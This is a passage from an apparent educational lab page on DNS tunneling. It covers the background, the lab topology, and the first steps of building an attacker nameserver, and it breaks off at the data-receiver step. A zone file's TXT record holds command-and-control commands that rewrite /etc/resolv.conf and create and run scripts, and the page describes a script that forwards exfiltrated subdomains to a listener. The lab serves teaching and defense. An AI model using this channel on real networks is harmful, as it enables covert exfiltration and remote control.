@@ -1,0 +1,1558 @@
+
+<!doctype html>
+<html lang="en" class="no-js">
+  <head>
+    
+      <meta charset="utf-8">
+      <meta name="viewport" content="width=device-width,initial-scale=1">
+      
+      
+      
+        <link rel="canonical" href="https://netexperiments.github.io/dnssecurity/attacks/abuse-misuse/tunneling/">
+      
+      
+        <link rel="prev" href="../ff-double/">
+      
+      
+        <link rel="next" href="../dgas/">
+      
+      
+        
+      
+      
+      <link rel="icon" href="../../../assets/images/favicon.png">
+      <meta name="generator" content="mkdocs-1.6.1, mkdocs-material-9.7.7">
+    
+    
+      
+        <title>DNS Tunneling - DNS Security</title>
+      
+    
+    
+      <link rel="stylesheet" href="../../../assets/stylesheets/main.ec1eaa64.min.css">
+      
+      
+
+
+    
+    
+      
+    
+    
+      
+        
+        
+        <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+        <link rel="stylesheet" href="https://fonts.googleapis.com/css?family=Roboto:300,300i,400,400i,700,700i%7CRoboto+Mono:400,400i,700,700i&display=fallback">
+        <style>:root{--md-text-font:"Roboto";--md-code-font:"Roboto Mono"}</style>
+      
+    
+    
+    <script>__md_scope=new URL("../../..",location),__md_hash=e=>[...e].reduce(((e,_)=>(e<<5)-e+_.charCodeAt(0)),0),__md_get=(e,_=localStorage,t=__md_scope)=>JSON.parse(_.getItem(t.pathname+"."+e)),__md_set=(e,_,t=localStorage,a=__md_scope)=>{try{t.setItem(a.pathname+"."+e,JSON.stringify(_))}catch(e){}}</script>
+    
+      
+
+    
+    
+  </head>
+  
+  
+    <body dir="ltr">
+  
+    
+    <input class="md-toggle" data-md-toggle="drawer" type="checkbox" id="__drawer" autocomplete="off">
+    <input class="md-toggle" data-md-toggle="search" type="checkbox" id="__search" autocomplete="off">
+    <label class="md-overlay" for="__drawer"></label>
+    <div data-md-component="skip">
+      
+    </div>
+    <div data-md-component="announce">
+      
+    </div>
+    
+    
+      
+
+<header class="md-header" data-md-component="header">
+  <nav class="md-header__inner md-grid" aria-label="Header">
+    <a href="../../.." title="DNS Security" class="md-header__button md-logo" aria-label="DNS Security" data-md-component="logo">
+      
+  
+  <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M12 8a3 3 0 0 0 3-3 3 3 0 0 0-3-3 3 3 0 0 0-3 3 3 3 0 0 0 3 3m0 3.54C9.64 9.35 6.5 8 3 8v11c3.5 0 6.64 1.35 9 3.54 2.36-2.19 5.5-3.54 9-3.54V8c-3.5 0-6.64 1.35-9 3.54"/></svg>
+
+    </a>
+    <label class="md-header__button md-icon" for="__drawer">
+      
+      <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M3 6h18v2H3zm0 5h18v2H3zm0 5h18v2H3z"/></svg>
+    </label>
+    <div class="md-header__title" data-md-component="header-title">
+      <div class="md-header__ellipsis">
+        <div class="md-header__topic">
+          <span class="md-ellipsis">
+            DNS Security
+          </span>
+        </div>
+        <div class="md-header__topic" data-md-component="header-topic">
+          <span class="md-ellipsis">
+            
+              DNS Tunneling
+            
+          </span>
+        </div>
+      </div>
+    </div>
+    
+    
+      <script>var palette=__md_get("__palette");if(palette&&palette.color){if("(prefers-color-scheme)"===palette.color.media){var media=matchMedia("(prefers-color-scheme: light)"),input=document.querySelector(media.matches?"[data-md-color-media='(prefers-color-scheme: light)']":"[data-md-color-media='(prefers-color-scheme: dark)']");palette.color.media=input.getAttribute("data-md-color-media"),palette.color.scheme=input.getAttribute("data-md-color-scheme"),palette.color.primary=input.getAttribute("data-md-color-primary"),palette.color.accent=input.getAttribute("data-md-color-accent")}for(var[key,value]of Object.entries(palette.color))document.body.setAttribute("data-md-color-"+key,value)}</script>
+    
+    
+    
+      
+      
+        <label class="md-header__button md-icon" for="__search">
+          
+          <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M9.5 3A6.5 6.5 0 0 1 16 9.5c0 1.61-.59 3.09-1.56 4.23l.27.27h.79l5 5-1.5 1.5-5-5v-.79l-.27-.27A6.52 6.52 0 0 1 9.5 16 6.5 6.5 0 0 1 3 9.5 6.5 6.5 0 0 1 9.5 3m0 2C7 5 5 7 5 9.5S7 14 9.5 14 14 12 14 9.5 12 5 9.5 5"/></svg>
+        </label>
+        <div class="md-search" data-md-component="search" role="dialog">
+  <label class="md-search__overlay" for="__search"></label>
+  <div class="md-search__inner" role="search">
+    <form class="md-search__form" name="search">
+      <input type="text" class="md-search__input" name="query" aria-label="Search" placeholder="Search" autocapitalize="off" autocorrect="off" autocomplete="off" spellcheck="false" data-md-component="search-query" required>
+      <label class="md-search__icon md-icon" for="__search">
+        
+        <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M9.5 3A6.5 6.5 0 0 1 16 9.5c0 1.61-.59 3.09-1.56 4.23l.27.27h.79l5 5-1.5 1.5-5-5v-.79l-.27-.27A6.52 6.52 0 0 1 9.5 16 6.5 6.5 0 0 1 3 9.5 6.5 6.5 0 0 1 9.5 3m0 2C7 5 5 7 5 9.5S7 14 9.5 14 14 12 14 9.5 12 5 9.5 5"/></svg>
+        
+        <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M20 11v2H8l5.5 5.5-1.42 1.42L4.16 12l7.92-7.92L13.5 5.5 8 11z"/></svg>
+      </label>
+      <nav class="md-search__options" aria-label="Search">
+        
+        <button type="reset" class="md-search__icon md-icon" title="Clear" aria-label="Clear" tabindex="-1">
+          
+          <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M19 6.41 17.59 5 12 10.59 6.41 5 5 6.41 10.59 12 5 17.59 6.41 19 12 13.41 17.59 19 19 17.59 13.41 12z"/></svg>
+        </button>
+      </nav>
+      
+    </form>
+    <div class="md-search__output">
+      <div class="md-search__scrollwrap" tabindex="0" data-md-scrollfix>
+        <div class="md-search-result" data-md-component="search-result">
+          <div class="md-search-result__meta">
+            Initializing search
+          </div>
+          <ol class="md-search-result__list" role="presentation"></ol>
+        </div>
+      </div>
+    </div>
+  </div>
+</div>
+      
+    
+    
+  </nav>
+  
+</header>
+    
+    <div class="md-container" data-md-component="container">
+      
+      
+        
+          
+            
+<nav class="md-tabs" aria-label="Tabs" data-md-component="tabs">
+  <div class="md-grid">
+    <ul class="md-tabs__list">
+      
+        
+  
+  
+  
+  
+    <li class="md-tabs__item">
+      <a href="../../.." class="md-tabs__link">
+        
+  
+  
+    
+  
+  Home
+
+      </a>
+    </li>
+  
+
+      
+        
+  
+  
+  
+  
+    <li class="md-tabs__item">
+      <a href="../../../setup/" class="md-tabs__link">
+        
+  
+  
+    
+  
+  Lab Setup
+
+      </a>
+    </li>
+  
+
+      
+        
+  
+  
+  
+  
+    
+    
+      <li class="md-tabs__item">
+        <a href="../../../enhancements/" class="md-tabs__link">
+          
+  
+  
+    
+  
+  DNS Security and Privacy Enhancements
+
+        </a>
+      </li>
+    
+  
+
+      
+        
+  
+  
+  
+    
+  
+  
+    
+    
+      <li class="md-tabs__item md-tabs__item--active">
+        <a href="../../" class="md-tabs__link">
+          
+  
+  
+    
+  
+  DNS Attacks and Countermeasures
+
+        </a>
+      </li>
+    
+  
+
+      
+    </ul>
+  </div>
+</nav>
+          
+        
+      
+      <main class="md-main" data-md-component="main">
+        <div class="md-main__inner md-grid">
+          
+            
+              
+              <div class="md-sidebar md-sidebar--primary" data-md-component="sidebar" data-md-type="navigation" >
+                <div class="md-sidebar__scrollwrap">
+                  <div class="md-sidebar__inner">
+                    
+
+
+  
+
+
+<nav class="md-nav md-nav--primary md-nav--lifted" aria-label="Navigation" data-md-level="0">
+  <label class="md-nav__title" for="__drawer">
+    <a href="../../.." title="DNS Security" class="md-nav__button md-logo" aria-label="DNS Security" data-md-component="logo">
+      
+  
+  <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M12 8a3 3 0 0 0 3-3 3 3 0 0 0-3-3 3 3 0 0 0-3 3 3 3 0 0 0 3 3m0 3.54C9.64 9.35 6.5 8 3 8v11c3.5 0 6.64 1.35 9 3.54 2.36-2.19 5.5-3.54 9-3.54V8c-3.5 0-6.64 1.35-9 3.54"/></svg>
+
+    </a>
+    DNS Security
+  </label>
+  
+  <ul class="md-nav__list" data-md-scrollfix>
+    
+      
+      
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../.." class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    Home
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+    
+      
+      
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../../setup/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    Lab Setup
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+    
+      
+      
+  
+  
+  
+  
+    
+    
+      
+        
+          
+        
+      
+        
+      
+        
+      
+    
+    
+    
+      
+      
+        
+      
+    
+    
+    <li class="md-nav__item md-nav__item--nested">
+      
+        
+        
+        <input class="md-nav__toggle md-toggle " type="checkbox" id="__nav_3" >
+        
+          
+          <div class="md-nav__link md-nav__container">
+            <a href="../../../enhancements/" class="md-nav__link ">
+              
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    DNS Security and Privacy Enhancements
+  
+
+    
+  </span>
+  
+  
+
+            </a>
+            
+              
+              <label class="md-nav__link " for="__nav_3" id="__nav_3_label" tabindex="0">
+                <span class="md-nav__icon md-icon"></span>
+              </label>
+            
+          </div>
+        
+        <nav class="md-nav" data-md-level="1" aria-labelledby="__nav_3_label" aria-expanded="false">
+          <label class="md-nav__title" for="__nav_3">
+            <span class="md-nav__icon md-icon"></span>
+            
+  
+    DNS Security and Privacy Enhancements
+  
+
+          </label>
+          <ul class="md-nav__list" data-md-scrollfix>
+            
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../../enhancements/dnssec/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    DNSSEC
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../../enhancements/doh/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    DNS-over-HTTPS (DoH)
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+          </ul>
+        </nav>
+      
+    </li>
+  
+
+    
+      
+      
+  
+  
+    
+  
+  
+  
+    
+    
+      
+        
+          
+        
+      
+        
+      
+        
+      
+        
+      
+    
+    
+    
+      
+        
+        
+      
+      
+        
+      
+    
+    
+    <li class="md-nav__item md-nav__item--active md-nav__item--section md-nav__item--nested">
+      
+        
+        
+        <input class="md-nav__toggle md-toggle " type="checkbox" id="__nav_4" checked>
+        
+          
+          <div class="md-nav__link md-nav__container">
+            <a href="../../" class="md-nav__link ">
+              
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    DNS Attacks and Countermeasures
+  
+
+    
+  </span>
+  
+  
+
+            </a>
+            
+              
+              <label class="md-nav__link " for="__nav_4" id="__nav_4_label" tabindex="">
+                <span class="md-nav__icon md-icon"></span>
+              </label>
+            
+          </div>
+        
+        <nav class="md-nav" data-md-level="1" aria-labelledby="__nav_4_label" aria-expanded="true">
+          <label class="md-nav__title" for="__nav_4">
+            <span class="md-nav__icon md-icon"></span>
+            
+  
+    DNS Attacks and Countermeasures
+  
+
+          </label>
+          <ul class="md-nav__list" data-md-scrollfix>
+            
+              
+            
+              
+                
+  
+  
+  
+  
+    
+    
+      
+        
+          
+        
+      
+        
+      
+        
+      
+    
+    
+    
+      
+      
+        
+          
+          
+        
+      
+    
+    
+    <li class="md-nav__item md-nav__item--section md-nav__item--nested">
+      
+        
+        
+        <input class="md-nav__toggle md-toggle " type="checkbox" id="__nav_4_2" >
+        
+          
+          <div class="md-nav__link md-nav__container">
+            <a href="../../protocol/" class="md-nav__link ">
+              
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    DNS Protocol and Resolution Attacks
+  
+
+    
+  </span>
+  
+  
+
+            </a>
+            
+              
+              <label class="md-nav__link " for="__nav_4_2" id="__nav_4_2_label" tabindex="">
+                <span class="md-nav__icon md-icon"></span>
+              </label>
+            
+          </div>
+        
+        <nav class="md-nav" data-md-level="2" aria-labelledby="__nav_4_2_label" aria-expanded="false">
+          <label class="md-nav__title" for="__nav_4_2">
+            <span class="md-nav__icon md-icon"></span>
+            
+  
+    DNS Protocol and Resolution Attacks
+  
+
+          </label>
+          <ul class="md-nav__list" data-md-scrollfix>
+            
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../protocol/rebinding/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    DNS Rebinding
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../protocol/dhcp-dns-spoofing/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    DHCP DNS Spoofing
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+          </ul>
+        </nav>
+      
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    
+    
+      
+        
+          
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+    
+    
+    
+      
+      
+        
+          
+          
+        
+      
+    
+    
+    <li class="md-nav__item md-nav__item--section md-nav__item--nested">
+      
+        
+        
+        <input class="md-nav__toggle md-toggle " type="checkbox" id="__nav_4_3" >
+        
+          
+          <div class="md-nav__link md-nav__container">
+            <a href="../../server/" class="md-nav__link ">
+              
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    DNS Server and Infrastructure Attacks
+  
+
+    
+  </span>
+  
+  
+
+            </a>
+            
+              
+              <label class="md-nav__link " for="__nav_4_3" id="__nav_4_3_label" tabindex="">
+                <span class="md-nav__icon md-icon"></span>
+              </label>
+            
+          </div>
+        
+        <nav class="md-nav" data-md-level="2" aria-labelledby="__nav_4_3_label" aria-expanded="false">
+          <label class="md-nav__title" for="__nav_4_3">
+            <span class="md-nav__icon md-icon"></span>
+            
+  
+    DNS Server and Infrastructure Attacks
+  
+
+          </label>
+          <ul class="md-nav__list" data-md-scrollfix>
+            
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../server/nxdomain-ddos/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    NXDOMAIN DDoS
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../server/cache-poisoning/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    DNS Cache Poisoning
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../server/kaminsky/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    Kaminsky Cache Poisoning
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../server/zone-transfer/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    Unauthorized Zone Transfer
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../server/dns-arp-poisoning/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    DNS ARP Poisoning
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+          </ul>
+        </nav>
+      
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+    
+  
+  
+  
+    
+    
+      
+        
+          
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+    
+    
+    
+      
+      
+        
+          
+          
+        
+      
+    
+    
+    <li class="md-nav__item md-nav__item--active md-nav__item--section md-nav__item--nested">
+      
+        
+        
+        <input class="md-nav__toggle md-toggle " type="checkbox" id="__nav_4_4" checked>
+        
+          
+          <div class="md-nav__link md-nav__container">
+            <a href="../" class="md-nav__link ">
+              
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    DNS Abuse/Misuse Attacks
+  
+
+    
+  </span>
+  
+  
+
+            </a>
+            
+              
+              <label class="md-nav__link " for="__nav_4_4" id="__nav_4_4_label" tabindex="">
+                <span class="md-nav__icon md-icon"></span>
+              </label>
+            
+          </div>
+        
+        <nav class="md-nav" data-md-level="2" aria-labelledby="__nav_4_4_label" aria-expanded="true">
+          <label class="md-nav__title" for="__nav_4_4">
+            <span class="md-nav__icon md-icon"></span>
+            
+  
+    DNS Abuse/Misuse Attacks
+  
+
+          </label>
+          <ul class="md-nav__list" data-md-scrollfix>
+            
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../amplification/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    DNS Amplification
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../ff-single/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    DNS Fast Flux Single-based
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../ff-double/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    DNS Fast Flux Double-based
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+    
+  
+  
+  
+    <li class="md-nav__item md-nav__item--active">
+      
+      <input class="md-nav__toggle md-toggle" type="checkbox" id="__toc">
+      
+      
+      
+      <a href="./" class="md-nav__link md-nav__link--active">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    DNS Tunneling
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+      
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../dgas/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    DGA-based
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../ff-dgas-tunneling/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    Fast Flux and DGA-based Tunneling
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+          </ul>
+        </nav>
+      
+    </li>
+  
+
+              
+            
+          </ul>
+        </nav>
+      
+    </li>
+  
+
+    
+  </ul>
+</nav>
+                  </div>
+                </div>
+              </div>
+            
+            
+              
+              <div class="md-sidebar md-sidebar--secondary" data-md-component="sidebar" data-md-type="toc" >
+                <div class="md-sidebar__scrollwrap">
+                  <div class="md-sidebar__inner">
+                    
+
+<nav class="md-nav md-nav--secondary" aria-label="Table of contents">
+  
+  
+  
+  
+</nav>
+                  </div>
+                </div>
+              </div>
+            
+          
+          
+            <div class="md-content" data-md-component="content">
+              
+              <article class="md-content__inner md-typeset">
+                
+                  
+
+
+
+<h1 id="background">Background</h1>
+<p>DNS tunneling is a cyberattack technique that leverages the DNS protocol to create a covert communication channel. This method allows attackers to bypass traditional security measures, such as firewalls and intrusion detection systems, by embedding malicious data within DNS queries and responses. The primary goal of DNS tunneling is to exfiltrate sensitive information from a compromised network or to establish command and control (C&amp;C) communication with malware. </p>
+<p>This technique exploits the inherent trust and ubiquity of the DNS protocol. The attack involves encoding data into the payload of DNS queries and responses, effectively creating a bidirectional communication channel.</p>
+<p>DNS tunneling can be divided into four main concepts: Data Encoding, DNS Query Transmission, Data Extraction, and Bidirectional Communication. </p>
+<p>Initially, the attacker encodes the data to be exfiltrated or the commands to be issued into the subdomains of DNS queries. For example, sensitive information can be broken down into smaller chunks and embedded within multiple DNS queries. The encoded DNS queries are then transmitted from the compromised system to a malicious DNS server controlled by the attacker. These queries appear as legitimate DNS traffic, making them difficult to detect. The malicious DNS server receives the queries, extracts the encoded data, and reconstructs the original information. </p>
+<figure>
+<p><img alt="Figure 1: DNS Tunneling attack" src="../../../images/background/Tunneling.png" width="600" />
+  </p>
+<figcaption>Figure 1: DNS Tunneling attack</figcaption>
+</figure>
+<p>Figure 1 shows a sensitive data extraction scenario using DNS Tunneling from a victim already infected with the attacker’s malware. These are the steps:</p>
+<ul>
+<li><strong>Step 1:</strong> The infected host issues a DNS query under attacker.com, with the leftmost label carrying an encoded representation of the stolen password.</li>
+<li><strong>Step 2:</strong> The DNS infrastructure carries that query to the attacker-controlled authoritative nameserver for attacker.com, where the encoded data becomes available to the attacker.</li>
+<li><strong>Step 3:</strong> That nameserver encodes a command such as run command.py in a DNS reply, for example in a <strong>TXT</strong> record.</li>
+<li><strong>Step 4:</strong> The DNS infrastructure returns that reply to the infected host, allowing the malware to receive the command. By repeating this process across multiple DNS exchanges, the attacker can maintain a covert
+bidirectional channel over apparently legitimate DNS traffic.</li>
+</ul>
+<p><br>
+<br></p>
+<h1 id="objectives">Objectives</h1>
+<p>Our goal with the following configurations is to simulate a DNS Tunneling attack. This lab demonstrates how attackers abuse the DNS protocol to encode and transmit data covertly, bypassing traditional network security controls that rarely inspect or block DNS traffic. You will act as both the attacker and the malware-infected victim, executing scripts to encode data into DNS queries, set up a rogue authoritative DNS server to receive and decode them, establish a covert communication channel, and observe how sensitive information can be silently exfiltrated through a protocol that most firewalls allow unconditionally. Hereafter, a malware-running victim may be referred to as a bot for the sake of simplicity.</p>
+<p><br>
+<br></p>
+<h1 id="lab-prerequisites-network-configuration">Lab Prerequisites &amp; Network Configuration</h1>
+<figure>
+<p><img alt="Figure 2: GNS3 Lab Topology" src="../../../images/tunneling-1.png" />
+  </p>
+<figcaption>Figure 2: GNS3 Lab Topology</figcaption>
+</figure>
+<p>In the GNS3 project showed in Figure 2, you will need to add in the following topology that uses four key nodes (be sure to previously check the <a href="../../../setup/" target="_blank">Lab Setup Guide</a>):</p>
+<table>
+<thead>
+<tr>
+<th>Node Name</th>
+<th>Role</th>
+<th>IP Address</th>
+<th>Subnet</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td><strong>Root Server</strong></td>
+<td>Root Zone ( .)</td>
+<td><strong>10.0.0.1</strong></td>
+<td>10.0.0.0/24</td>
+</tr>
+<tr>
+<td><strong>TLD (Top Level Domain) Server</strong></td>
+<td>Top-Level Domain (.com)</td>
+<td><strong>10.0.1.1</strong></td>
+<td>10.0.1.0/24</td>
+</tr>
+<tr>
+<td><strong>NS Attacker (Attacker Nameserver)</strong></td>
+<td>Authoritative nameserver for attacker.com</td>
+<td><strong>10.0.2.1</strong></td>
+<td>10.0.2.0/24</td>
+</tr>
+<tr>
+<td><strong>Attacker</strong></td>
+<td>Receives the extracted data</td>
+<td><strong>10.0.3.1</strong></td>
+<td>10.0.3.0/24</td>
+</tr>
+<tr>
+<td><strong>Resolver</strong></td>
+<td>Recursive DNS Server</td>
+<td><strong>10.0.4.1</strong></td>
+<td>10.0.4.0/24</td>
+</tr>
+<tr>
+<td><strong>Victim</strong></td>
+<td>Malware-infected victim. Contains sensitive data</td>
+<td><strong>10.0.5.1</strong></td>
+<td>10.0.5.0/24</td>
+</tr>
+</tbody>
+</table>
+<p><br></p>
+<p>The following scripts were used in this lab:</p>
+<ul>
+<li><a href="../../../scripts/tunneling_nameserver.py" download>tunneling_nameserver.py</a></li>
+<li><a href="../../../scripts/tunneling_attacker.py" download>tunneling_attacker.py</a></li>
+<li><a href="../../../scripts/tunneling_victim.py" download>tunneling_victim.py</a></li>
+<li><a href="../../../scripts/tunneling_blocker.py" download>tunneling_blocker.py</a></li>
+</ul>
+<p><br>
+<br></p>
+<h1 id="phase-1-setting-up-the-attackers-infrastructure">Phase 1: Setting up the Attacker's Infrastructure</h1>
+<p>The attacker needs to prepare a nameserver to receive the queries and a listener to collect the exfiltrated data.</p>
+<h3 id="step-11-configure-the-attacker-nameserver">Step 1.1: Configure the Attacker Nameserver</h3>
+<p>On the <strong>Attacker Nameserver</strong>,</p>
+<p>1 - Create the <code>db.attacker</code> zone file:</p>
+<p><div class="highlight"><pre><span></span><code><span class="n">nano</span> <span class="o">/</span><span class="n">etc</span><span class="o">/</span><span class="n">bind</span><span class="o">/</span><span class="n">db</span><span class="o">.</span><span class="n">attacker</span>
+</code></pre></div>
+<div class="highlight"><pre><span></span><code><span class="n">attacker</span><span class="o">.</span><span class="n">com</span><span class="o">.</span> <span class="n">IN</span> <span class="n">SOA</span> <span class="n">ns1</span><span class="o">.</span><span class="n">attacker</span><span class="o">.</span><span class="n">com</span><span class="o">.</span> <span class="n">admin</span><span class="o">.</span><span class="n">attacker</span><span class="o">.</span><span class="n">com</span><span class="o">.</span> <span class="p">(</span>
+    <span class="mi">1</span> <span class="mi">7200</span> <span class="mi">3600</span> <span class="mi">1209600</span> <span class="mi">86400</span>
+<span class="p">)</span>
+    <span class="n">NS</span> <span class="n">ns1</span><span class="o">.</span><span class="n">attacker</span><span class="o">.</span><span class="n">com</span><span class="o">.</span>
+<span class="n">ns1</span><span class="o">.</span><span class="n">attacker</span><span class="o">.</span><span class="n">com</span><span class="o">.</span> <span class="n">A</span> <span class="mf">10.0.2.1</span>
+
+<span class="o">@</span>                <span class="n">IN</span>      <span class="n">A</span>       <span class="mf">10.0.3.1</span>
+<span class="o">*</span>                <span class="n">IN</span>      <span class="n">A</span>       <span class="mf">10.0.3.1</span>
+<span class="n">www</span>              <span class="n">IN</span>      <span class="n">A</span>       <span class="mf">10.0.3.1</span>
+<span class="o">*</span>                <span class="n">IN</span>     <span class="n">TXT</span>      <span class="s2">&quot;###python3 command2.py&quot;&quot;###ls -l /home&quot;&quot;###echo -e ~import dns.resolver&quot;&quot;##import os&quot;&quot;##target_domain = ~new_attacker.com~ ns_records = dns.resolver.resolve(target_domain, ~NS~)~ &gt; command3.py&quot;&quot;###python3 command3.py&quot;&quot;###echo -e ~nameserver 10.0.2.1~ &gt; /etc/resolv.conf&quot;</span>
+</code></pre></div></p>
+<p>2 - Restart the BIND service (named):</p>
+<p><div class="highlight"><pre><span></span><code>pkill<span class="w"> </span>named<span class="w"> </span><span class="o">&amp;&amp;</span><span class="w"> </span>named<span class="w"> </span>-c<span class="w"> </span>/etc/bind/named.conf
+</code></pre></div>
+<br></p>
+<p>On the <strong>TLD Server</strong>,</p>
+<p>3 - Modify <code>/etc/bind/db.com</code> file:</p>
+<div class="highlight"><pre><span></span><code><span class="n">nano</span> <span class="o">/</span><span class="n">etc</span><span class="o">/</span><span class="n">bind</span><span class="o">/</span><span class="n">db</span><span class="o">.</span><span class="n">attacker</span>
+</code></pre></div>
+<p>Add in the attacker nameserver information at the end of the file.</p>
+<div class="highlight"><pre><span></span><code><span class="n">attacker</span><span class="o">.</span><span class="n">com</span><span class="o">.</span>    <span class="n">IN</span>  <span class="n">NS</span>  <span class="n">ns1</span><span class="o">.</span><span class="n">attacker</span><span class="o">.</span><span class="n">com</span><span class="o">.</span>
+<span class="n">ns1</span><span class="o">.</span><span class="n">attacker</span><span class="o">.</span><span class="n">com</span><span class="o">.</span> <span class="n">IN</span>  <span class="n">A</span>   <span class="mf">10.0.2.1</span>
+</code></pre></div>
+<p>4 - Restart the BIND service (named):</p>
+<p><div class="highlight"><pre><span></span><code>pkill<span class="w"> </span>named<span class="w"> </span><span class="o">&amp;&amp;</span><span class="w"> </span>named<span class="w"> </span>-c<span class="w"> </span>/etc/bind/named.conf
+</code></pre></div>
+<br></p>
+<p>On the <strong>Resolver</strong>,</p>
+<p>5 - Check if /etc/bind/db.root has the correct address of Root Server</p>
+<p>6 - Test DNS resolution: <code>dig anything.attacker.com</code></p>
+<p><br>
+The Attacker Nameserver needs to be authoritative for attacker.com. This is where the initial DNS queries from the Victim will land. Define and configure the zone on the Attacker Nameserver. Create the necessary BIND zone file that includes a wildcard record to ensure all subdomains resolve. Also modify TLD db.com zone file to have the necessary information about the Attacker Nameserver. Make sure the Root Server, Resolver are correctly configured with the IP addresses for this lab, check <a href="../../../setup/" target="_blank">Lab Setup Guide</a>.</p>
+<p><br>
+<br></p>
+<h3 id="step-12-set-up-the-dns-exfiltrator">Step 1.2: Set up the DNS Exfiltrator</h3>
+<p>On the <strong>Attacker Nameserver</strong>, run:</p>
+<div class="highlight"><pre><span></span><code>python3<span class="w"> </span>/home/tunneling_nameserver.py
+</code></pre></div>
+<p>The <code>tunneling_nameserver.py</code> script on the Attacker Nameserver will capture DNS packets, extract the subdomain, and forward it to the data receiver.</p>
+<p>This script has two concurrent responsibilities, handled via a main thread and a background worker thread: Packet sniffing (main thread), using Scapy, it listens on UDP port 53 for all incoming DNS queries. For every packet, it checks whether it's a <code>TXT</code>-record query (query type 16, qr == 0 meaning it's a question not a response) destined for the attacker.com domain. When it finds one, it strips the <code>.attacker.com</code> suffix and extracts just the subdomain prefix (which is the actual encoded data the victim machine sent); and Data forwarding (background thread), in which, for each subdomain it pulls out, it opens a fresh TCP connection to 10.0.3.1:9999 and sends the subdomain string there. 
+<br>
+<br></p>
+<h3 id="step-13-set-up-the-data-receiver">Step 1.3: Set up the Data Receiver</h3>
